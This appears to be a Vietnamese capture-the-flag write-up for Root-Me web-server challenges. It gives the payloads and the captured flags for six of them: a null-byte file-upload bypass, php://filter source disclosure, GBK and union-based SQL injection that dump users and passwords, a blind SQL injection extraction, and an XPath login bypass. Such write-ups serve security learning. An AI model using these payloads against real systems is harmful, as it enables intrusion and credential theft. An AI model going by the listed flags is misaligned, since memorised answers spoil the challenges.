#Mục lục:

>[1. HTML]

>[2. Weak password]

>[3. User-agent]

>[4. Backup file]

>[5. HTTP directory indexing]

>[6. HTTP Headers]

>[7. HTTP verb tampering]

>[8. Install files]

>[9. Improper redirect]

>[10. CRLF]

>[11. File upload - double extensions]

>[12. File upload - MIME type]

>[13. HTTP cookies]

>[14. Directory traversal]

>[15. File upload - null byte](#15)

>[16. PHP filters](#16)

>[17. PHP register globals]

>[18. Local File Inclusion]

>[19. Local File Inclusion - Double encoding ]

>[20. PHP type juggling]

>[21. Preg_Replace]

>[22. Remote File Inclusion]

>[23. Server-side Template Injection]

>[24. SQL injection - authentication]

>[25. SQL injection - authentication - GBK](#25)

>[26. SQL injection - string](#26)

>[27. LDAP injection - authentication]

>[28. NoSQL injection - authentication]

>[29. Path Truncation]

>[30. PHP Serialization]

>[31. SQL injection - numeric](#31)

>[32. SQL Truncation]

>[33. XML External Entity]

>[34. XPath injection - authentication](#34)

>[35. Local File Inclusion - Wrappers]

>[36. SQL injection - Error]

>[37. SQL injection - Insert]

>[38. SQL injection - file reading]

>[39. XPath injection - string]

>[40. SQL injection - Time based]

>[41. SQL injection - blind]

>[42. LDAP injection - blind]

>[43. XPath injection - blind]

>[44. SQL injection - filter bypass]

#Nội dung
<a name='15'></a>
##15. File upload - null byte 

[+] URL: `http://challenge01.root-me.org/web-serveur/ch22/?action=upload`

[+] Filter: `shell.php%00.jpg`

[+] Vulnerable: upload nullbyte

[+] File: [shell.php%00.jpg](../prog/shell.php%00.jpg)

[+] Flag: `YPNchi2NmTwygr2dgCCF`
<a name='16'></a>
##16. PHP filters 

[+] URL: `http://challenge01.root-me.org/web-serveur/ch12/`

[+] Filter: 
 ```
 /index.php?inc=php://filter/convert.base64-encode/resource=index.php
 /index.php?inc=php://filter/convert.base64-encode/resource=ch12.php
 /index.php?inc=php://filter/convert.base64-encode/resource=config.php
 ```
[+] Vulnerable: `include()`

[+] flag: `admin:DAPt9D2mky0APAF`
<a name="25"></a>
##25. SQL injection - authentication - GBK 

[+] URL: `http://challenge01.root-me.org/web-serveur/ch42/`

[+] Sql injection: `login=%bf' or 1=1 -- -&password=abc`

[+] Vulnerable: `addslashes()` or `magic_quotes_gpc()`. 

[+] Solution: gbk charset encode

[+] flag: `iMDaFlag1337!`
<a name="26"></a>
##26. SQL injection - string 

[+] URL: `http://challenge01.root-me.org/web-serveur/ch19/?action=recherche`

[+] Sql injection: `' union select (select group_concat(username, password) from users),2  -- -`

[+] Vulnerable: sql string (quote) query

[+] flag: `c4K04dtIaJsuWdi`
<a name='31'></a>
##31. SQL injection - numeric 

[+] URL: `http://challenge01.root-me.org/web-serveur/ch18/`

[+] Sql injection: `1 or (select substr(group_concat(username, password),i,1) from users)=(select char(j))  -- -`

 [-] Trong đó: i là vị trí kí tự trong chuỗi trả về được cắt ra; j là mã ascii của kí tự bruteforce

[+] Vulnerable: sql number query

[+] code: [sqli-numberic.py](../prog/sqli-numberic.py)

[+] flag: `aTlkJYLjcbLmue3`
<a name="34"></a>
##34. XPath injection - authentication 

[+] URL: `http://challenge01.root-me.org/web-serveur/ch23/`

[+] Sql injection: `username=John'+or+'1'='1&password=abc`

[+] Vulnerable: base sqli

[+] flag: `6FkC67ui8njEepIK5Gr2Kwe`